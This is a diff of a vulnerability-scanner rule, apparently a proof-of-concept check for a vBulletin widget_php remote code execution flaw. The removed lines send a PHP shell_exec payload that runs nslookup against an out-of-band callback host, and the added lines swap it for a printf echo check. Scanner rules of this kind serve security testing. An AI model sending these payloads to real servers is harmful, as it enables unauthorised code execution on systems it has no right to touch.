@@ -3,10 +3,10 @@ rules:
   - method: POST
     path: /
     body: >-
-      routestring=/ajax/render/widget_php&widgetConfig%5bcode%5d=echo%20shell_exec('nslookup%20{{reverse_domain}}%20{{reverse_ip}}');%20exit;
-    follow_redirects: false
+      routestring=/ajax/render/widget_php&widgetConfig[code]=printf('2019%%0926');
+    follow_redirects: true
     expression: |
-      status_code==200 && waitReverse(5)
+      body.bcontains(b'20190926')
 
 detail:
   author: JingLing(https://hackfun.org/)
